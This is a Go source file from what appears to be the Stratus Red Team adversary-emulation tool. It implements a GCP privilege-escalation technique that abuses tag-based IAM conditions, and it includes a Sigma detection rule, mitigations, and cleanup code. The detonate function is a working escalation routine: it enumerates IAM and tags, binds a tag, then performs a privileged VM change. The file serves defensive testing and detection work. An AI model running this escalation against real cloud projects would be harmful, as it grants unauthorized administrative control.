package gcp

import (
	"context"
	_ "embed"
	"fmt"
	"log"
	"strings"
	"time"

	resourcemanager "cloud.google.com/go/resourcemanager/apiv3"
	"cloud.google.com/go/resourcemanager/apiv3/resourcemanagerpb"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	oldcrm "google.golang.org/api/cloudresourcemanager/v3"
	"google.golang.org/api/compute/v1"
	"google.golang.org/api/iterator"
	"google.golang.org/api/option"
)

//go:embed main.tf
var tf []byte

func init() {
	const codeBlock = "```"
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "gcp.privilege-escalation.tag-based-privilege-escalation",
		FriendlyName: "Privilege Escalation via GCP Tag Bindings",
		Description: `
Simulates a privilege escalation attack in Google Cloud Platform (GCP) by exploiting IAM Conditions that use resource tags.

Warm-up:

- Creates a tag key and value with dynamically generated names
- Creates a Compute Engine VM instance
- Sets up an IAM policy with a conditional binding that grants compute.admin role when a resource has the dynamically created tag
- Grants the current user roles/resourcemanager.tagUser and roles/viewer permissions

Detonation:

- Enumerates IAM policies to discover conditional role bindings
- Lists available tag keys and values in the environment
- Creates a tag binding to attach the dynamically created tag to the VM instance
- Attempts a privileged operation (modifying the VM's description) that should succeed after the tag is attached

References:

- https://www.mitiga.io/blog/tag-your-way-in-new-privilege-escalation-technique-in-gcp
`,
		Detection: `
Using GCP Admin Activity audit logs, look for the sequence of events that indicates this attack pattern:

1. Enumeration of IAM policies (GetIamPolicy)
2. Listing tag keys and values (TagKeys.ListTagKeys, TagKeys.ListTagValues)
3. Creating a tag binding (TagBindings.CreateTagBinding)
4. Performing a privileged operation shortly after the tag binding is created

Sample Sigma rule to detect this activity:

` + codeBlock + `yaml
title: GCP Privilege Escalation via TagBinding
id: GCP-PRIVESC-TAGBINDING
description: >
  Detects a sequence in GCP logs where a user enumerates IAM policies and tags,
  binds a tag to a resource, and then performs a privileged action on that resource.
logsource:
  category: cloud.audit
  product: gcp
detection:
  selection_enum_iam_tags:
    methodName|contains:
      - "GetIamPolicy"
      - "TagKeys.ListTagKeys"
      - "TagKeys.ListTagValues"
      - "TagBindings.ListEffectiveTags"

  selection_tag_binding:
    methodName: "TagBindings.CreateTagBinding"

  selection_privileged:
    methodName|in: # List of privileged API methods
      - "beta.compute.instances.setIamPolicy"
      - "compute.instances.update"
      - "compute.instances.setMetadata"
      # Add more privileged operations

  timeframe: 15m

  condition: selection_enum_iam_tags followed by 
             selection_tag_binding followed by 
             selection_privileged
fields:
  - principalEmail
  - resourceName
  - methodName
  - timestamp
  - project_id
level: high
` + codeBlock + `

Mitigation strategies:

- Treat tag management as privileged - only grant roles/resourcemanager.tagUser to trusted entities
- Separate tagging and access boundaries - ensure identities cannot both set a tag and benefit from that tag
- Use deny policies or organization policies to block risky combinations
- Restrict tag inheritance scope through proper folder and project structure
`,
		Platform:                   stratus.GCP,
		IsIdempotent:               true,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.PrivilegeEscalation},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

// Helper function to return a pointer to a string
func stringPtr(s string) *string {
	return &s
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	ctx := context.Background()
	projectID := params["project_id"]
	instanceName := params["vm_instance_name"]
	zone := params["zone"]
	tagKey := params["tag_key"]
	tagValue := params["tag_value"]
	tagValueFullName := params["tag_value_full_name"]

	log.Println("Starting tag-based privilege escalation simulation...")

	// Step 1: Enumerate IAM policies to find conditional bindings
	log.Println("Step 1: Enumerating IAM policies to discover conditional role bindings")
	crmService, err := oldcrm.NewService(ctx, providers.GCP().Options())
	if err != nil {
		return fmt.Errorf("failed to create Cloud Resource Manager client: %v", err)
	}

	resource := fmt.Sprintf("projects/%s", projectID)
	policyRequest := &oldcrm.GetIamPolicyRequest{
		Options: &oldcrm.GetPolicyOptions{
			RequestedPolicyVersion: 3, // Version 3 supports conditions
		},
	}
	policy, err := crmService.Projects.GetIamPolicy(resource, policyRequest).Do()
	if err != nil {
		return fmt.Errorf("failed to get IAM policy: %v", err)
	}

	log.Println("Retrieved project IAM policy. Checking for conditional bindings...")

	// Check for conditional bindings in the policy that use tags
	foundConditionalBinding := false
	for _, binding := range policy.Bindings {
		if binding.Condition != nil && strings.Contains(binding.Condition.Expression, "matchTag") {
			foundConditionalBinding = true
			log.Printf("Found conditional binding for role %s with condition: %s\n",
				binding.Role, binding.Condition.Expression)
		}
	}

	if !foundConditionalBinding {
		log.Println("Warning: No tag-based conditional bindings found in the API. For the purpose of this simulation, we'll continue assuming the IAM condition exists (it was created in the Terraform configuration).")
		log.Printf("Expected condition: resource.matchTag('%s', '%s') should grant compute.admin role", tagKey, tagValue)
	}

	// Step 2: List available tags
	log.Println("Step 2: Listing available tag keys and values")

	// List tag keys using the TagKeys API
	tagKeysResponse, err := crmService.TagKeys.List().Parent("projects/" + projectID).Do()
	if err != nil {
		log.Printf("Warning: Could not list tag keys: %v", err)
	} else {
		log.Printf("Found %d tag keys in the project", len(tagKeysResponse.TagKeys))
		for _, key := range tagKeysResponse.TagKeys {
			log.Printf("Tag key: %s (name: %s)", key.ShortName, key.Name)

			// List tag values for this key
			tagValuesResponse, err := crmService.TagValues.List().Parent(key.Name).Do()
			if err != nil {
				log.Printf("Warning: Could not list tag values for key %s: %v", key.ShortName, err)
			} else {
				log.Printf("Found %d tag values for key %s", len(tagValuesResponse.TagValues), key.ShortName)
				for _, value := range tagValuesResponse.TagValues {
					log.Printf("Tag value: %s=%s (name: %s)", key.ShortName, value.ShortName, value.Name)
				}
			}
		}
	}

	log.Printf("Target tag key: %s with value: %s (full name: %s)\n", tagKey, tagValue, tagValueFullName)

	// Step 3: Create tag binding to attach the tag to the VM instance
	log.Printf("Step 3: Creating tag binding to attach the %s=%s tag to the VM instance", tagKey, tagValue)

	computeService, err := compute.NewService(ctx, providers.GCP().Options())
	if err != nil {
		return fmt.Errorf("failed to create Compute Engine client: %v", err)
	}

	// Get the VM instance
	instance, err := computeService.Instances.Get(projectID, zone, instanceName).Do()
	if err != nil {
		return fmt.Errorf("failed to get VM instance: %v", err)
	}

	// --- Get Numeric Project ID ---
	// Use the old CRM client to get project details, ensuring we have the numeric ID
	oldCrmService, err := oldcrm.NewService(ctx, providers.GCP().Options())
	if err != nil {
		// Handle error appropriately - maybe return if we can't get the client
		log.Printf("Warning: could not create old CRM service to get project number: %v", err)
		// Attempt to proceed with the potentially non-numeric projectID, but log it
		log.Printf("Proceeding with potentially non-numeric project ID: %s", projectID)
	}
	projectNumberStr := projectID // Default to using the input ID
	if oldCrmService != nil {
		projectResourceStr := fmt.Sprintf("projects/%s", projectID) // Use input ID here
		project, err := oldCrmService.Projects.Get(projectResourceStr).Do()
		if err != nil {
			log.Printf("Warning: Failed to get project details for '%s' to confirm numeric ID: %v", projectID, err)
			log.Printf("Proceeding with potentially non-numeric project ID: %s", projectID)
		} else {
			// Extract numeric project ID (remove 'projects/' prefix)
			projectNumberStr = strings.TrimPrefix(project.Name, "projects/")
			log.Printf("Confirmed numeric project ID: %s", projectNumberStr)
		}
	}

	// Create TagBindings client using the global endpoint
	globalEndpoint := "cloudresourcemanager.googleapis.com:443"
	clientOpts := []option.ClientOption{
		providers.GCP().Options(),
		option.WithEndpoint(globalEndpoint),
	}
	tagBindingsClient, err := resourcemanager.NewTagBindingsClient(ctx, clientOpts...)
	if err != nil {
		return fmt.Errorf("failed to create global TagBindingsClient: %v", err)
	}
	defer tagBindingsClient.Close()

	// Use the correct resource name format for project-level tag binding
	projectResource := fmt.Sprintf("//cloudresourcemanager.googleapis.com/projects/%s", projectNumberStr)

	// Create the tag binding request
	createBindingRequest := &resourcemanagerpb.CreateTagBindingRequest{
		TagBinding: &resourcemanagerpb.TagBinding{
			Parent:   projectResource,
			TagValue: tagValueFullName,
		},
	}

	log.Printf("Creating tag binding: Attaching %s=%s tag to project using global endpoint", tagKey, tagValue)
	createBindingOperation, err := tagBindingsClient.CreateTagBinding(ctx, createBindingRequest)
	if err != nil {
		log.Printf("Error creating project-level tag binding: %v", err)
		log.Printf("Tag binding failed, cannot proceed with escalation attempt via tags.")
	} else {
		log.Printf("Project-level tag binding creation succeeded. Operation name: %s", createBindingOperation.Name())

		// Wait for the tag binding operation to complete
		log.Println("Waiting for tag binding operation to complete...")
		_, err := createBindingOperation.Wait(ctx)
		if err != nil {
			log.Printf("Warning: Failed waiting for tag binding operation: %v", err)
		} else {
			log.Println("Tag binding operation completed successfully")
		}
	}

	// Step 4: Attempt a privileged operation (this will actually perform it, not just simulate)
	log.Println("Step 4: Attempting a privileged operation (updating VM description)")

	// Wait for tags to propagate - allow time for IAM changes to take effect
	log.Println("Waiting for tags to propagate and IAM condition to take effect...")
	time.Sleep(10 * time.Second)

	success := false

	// Update the VM's metadata using the labels field
	log.Println("Attempting method 1: Updating VM labels")
	updatedLabels := make(map[string]string)
	if instance.Labels != nil {
		for k, v := range instance.Labels {
			updatedLabels[k] = v
		}
	}
	updatedLabels["modified_by"] = "stratus_red_team"

	labelUpdateOp, err := computeService.Instances.SetLabels(
		projectID,
		zone,
		instanceName,
		&compute.InstancesSetLabelsRequest{
			Labels:           updatedLabels,
			LabelFingerprint: instance.LabelFingerprint,
		}).Do()

	if err != nil {
		log.Printf("VM label update failed: %v", err)
	} else {
		log.Printf("Successfully initiated VM label update. Operation: %s", labelUpdateOp.Name)
		success = true

		// Monitor the operation
		for range 5 {
			time.Sleep(2 * time.Second)
			op, err := computeService.ZoneOperations.Get(projectID, zone, labelUpdateOp.Name).Do()
			if err != nil {
				log.Printf("Warning: Failed to get operation status: %v", err)
				break
			}

			if op.Status == "DONE" {
				if op.Error != nil {
					log.Println("Label update operation completed with errors")
					success = false
				} else {
					log.Println("Label update operation completed successfully")
				}
				break
			}
		}
	}

	if success {
		log.Println("Privilege escalation successful! The tag binding granted elevated permissions to modify the VM.")
	} else {
		log.Println("Privilege escalation attempts failed. This could be due to several reasons:")
		log.Println("1. The tag binding did not grant the expected privileges")
		log.Println("2. IAM permissions haven't fully propagated yet (can take several minutes)")
		log.Println("3. The VM is in a state that doesn't allow modifications")
		log.Println("In a real attack scenario, the attacker might wait longer or try different approaches.")
		// We won't throw an error here, as the attack demonstration is still valid even if actual escalation fails
	}

	log.Println("Privilege escalation demonstration completed")
	return nil
}

// revert cleans up tag bindings created during the attack to ensure proper cleanup of resources
func revert(params map[string]string, providers stratus.CloudProviders) error {
	ctx := context.Background()
	projectID := params["project_id"]
	tagValueFullName := params["tag_value_full_name"]

	log.Println("Reverting tag-based privilege escalation - cleaning up tag bindings...")

	// We need to get the project number to format resource names correctly
	oldCrmService, err := oldcrm.NewService(ctx, providers.GCP().Options())
	if err != nil {
		return fmt.Errorf("failed to create Cloud Resource Manager client: %v", err)
	}

	// Get project number
	projectNumberStr := projectID // Default to using the input ID
	projectResourceStr := fmt.Sprintf("projects/%s", projectID)
	project, err := oldCrmService.Projects.Get(projectResourceStr).Do()
	if err != nil {
		log.Printf("Warning: Failed to get project details for '%s': %v", projectID, err)
	} else {
		projectNumberStr = strings.TrimPrefix(project.Name, "projects/")
		log.Printf("Retrieved project ID: %s", projectNumberStr)
	}

	// Create TagBindings client using the global endpoint
	globalEndpoint := "cloudresourcemanager.googleapis.com:443"
	clientOpts := []option.ClientOption{
		providers.GCP().Options(),
		option.WithEndpoint(globalEndpoint),
	}
	tagBindingsClient, err := resourcemanager.NewTagBindingsClient(ctx, clientOpts...)
	if err != nil {
		return fmt.Errorf("failed to create TagBindingsClient: %v", err)
	}
	defer tagBindingsClient.Close()

	// List tag bindings to find the one we created
	// Try multiple parent formats based on what works with the API
	parentFormats := []string{
		// Format that worked for creating the binding
		fmt.Sprintf("//cloudresourcemanager.googleapis.com/projects/%s", projectNumberStr),
		// Default projects format
		fmt.Sprintf("projects/%s", projectNumberStr),
	}

	// Try listing with each parent format
	found := false
	var bindingsFound []*resourcemanagerpb.TagBinding

	for _, parentFormat := range parentFormats {
		log.Printf("Listing tag bindings for parent: %s", parentFormat)
		listReq := &resourcemanagerpb.ListTagBindingsRequest{
			Parent: parentFormat,
		}

		listIterator := tagBindingsClient.ListTagBindings(ctx, listReq)
		hasAny := false

		// Collect all bindings
		for {
			binding, err := listIterator.Next()
			if err == iterator.Done {
				break
			}
			if err != nil {
				log.Printf("Error listing tag bindings with parent format '%s': %v", parentFormat, err)
				break
			}

			hasAny = true
			bindingsFound = append(bindingsFound, binding)
			log.Printf("Found tag binding - Parent: %s, TagValue: %s, Name: %s",
				binding.Parent, binding.TagValue, binding.Name)
		}

		if hasAny {
			log.Printf("Successfully listed tag bindings with parent format: %s", parentFormat)
			break
		}
	}

	// Find and delete any bindings that match our tag value
	found = false
	for _, binding := range bindingsFound {
		// Check if this binding matches our tag value
		if binding.TagValue == tagValueFullName {
			log.Printf("Found matching tag binding to remove: %s", binding.Name)
			found = true

			// Delete the tag binding
			deleteOp, err := tagBindingsClient.DeleteTagBinding(ctx, &resourcemanagerpb.DeleteTagBindingRequest{
				Name: binding.Name,
			})

			if err != nil {
				log.Printf("Error deleting tag binding: %v", err)
			} else {
				log.Printf("Started tag binding deletion, operation: %s", deleteOp.Name())

				// Wait for deletion to complete
				log.Println("Waiting for tag binding deletion to complete...")
				err = deleteOp.Wait(ctx)
				if err != nil {
					log.Printf("Error waiting for tag binding deletion: %v", err)
				} else {
					log.Println("Tag binding successfully deleted")
				}
			}
		}
	}

	// If no matching bindings found with listing, try direct deletion
	if !found {
		log.Println("No matching tag bindings found with listing. Trying direct deletion...")

		// Extract the tag value ID from the full name
		tagValueParts := strings.Split(tagValueFullName, "/")
		if len(tagValueParts) > 0 {
			tagValueID := tagValueParts[len(tagValueParts)-1]

			// Try direct deletion with different name formats
			projectResource := fmt.Sprintf("projects/%s", projectNumberStr)
			bindingNamePatterns := []string{
				// Format based on previous successful creation
				fmt.Sprintf("tagBindings/cloudresourcemanager.googleapis.com/projects/%s/tagValues/%s",
					projectNumberStr, tagValueID),
				fmt.Sprintf("tagBindings/projects/%s/tagValues/%s",
					projectNumberStr, tagValueID),
				// Try other common formats
				fmt.Sprintf("tagBindings/%s/%s", projectResource, tagValueFullName),
				fmt.Sprintf("tagBindings//cloudresourcemanager.googleapis.com/projects/%s/%s",
					projectNumberStr, tagValueFullName),
			}

			for i, namePattern := range bindingNamePatterns {
				log.Printf("Trying direct deletion format #%d: %s", i+1, namePattern)
				deleteOp, err := tagBindingsClient.DeleteTagBinding(ctx, &resourcemanagerpb.DeleteTagBindingRequest{
					Name: namePattern,
				})

				if err != nil {
					log.Printf("Error with direct deletion attempt #%d: %v", i+1, err)
				} else {
					log.Printf("Direct deletion initiated. Operation name: %s", deleteOp.Name())

					// Wait for deletion to complete
					err = deleteOp.Wait(ctx)
					if err != nil {
						log.Printf("Error waiting for direct deletion: %v", err)
					} else {
						log.Println("Tag binding successfully deleted with direct approach")
						found = true
						break
					}
				}
			}
		}
	}

	if !found {
		log.Println("WARNING: Could not find or delete the tag binding. Terraform cleanup may fail.")
		// As a last resort, we should try to wait longer to allow any automatic propagation
		log.Println("Waiting 30 seconds for any ongoing operations to complete before Terraform cleanup...")
		time.Sleep(30 * time.Second)
	}

	// Add a brief delay to allow the deletion to propagate before Terraform starts cleanup
	log.Println("Sleeping for 5 seconds to allow tag binding deletion to propagate...")
	time.Sleep(5 * time.Second)

	return nil
}
